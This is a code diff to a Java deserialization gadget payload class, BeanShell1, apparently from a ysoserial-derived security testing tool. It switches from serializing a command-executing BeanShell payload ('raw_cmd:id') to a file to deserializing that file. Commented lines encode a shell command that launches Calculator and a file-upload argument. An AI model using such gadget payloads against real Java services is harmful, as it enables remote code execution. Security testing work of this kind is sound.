@@ -2,7 +2,10 @@ package me.gv7.woodpecker.yso.payloads;
 
 import bsh.Interpreter;
 import bsh.NameSpace;
+
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
@@ -72,10 +75,13 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
         //args = new String[]{"script_base64:bmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlclsnKGphdmEubGFuZy5TdHJpbmdbXSknXShbJy9iaW4vc2gnLCctYycsJ29wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvciddKS5zdGFydCgp"};
         //args = new String[]{"upload_file_base64:/tmp/a.txt|YzBueTE="};
         //PayloadRunner.run(BeanShell1.class, args);
-        String command = "raw_cmd:id";
-        Object cc6 = new BeanShell1().getObject(command);
-        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("beanshell.1.3.0.ser"));
-        oos.writeObject(cc6);
-        oos.flush();
+//        String command = "raw_cmd:id";
+//        Object cc6 = new BeanShell1().getObject(command);
+//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("beanshell.1.3.0.ser"));
+//        oos.writeObject(cc6);
+//        oos.flush();
+
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("beanshell.1.3.0.ser"));
+        objectInputStream.readObject();
     }
 }
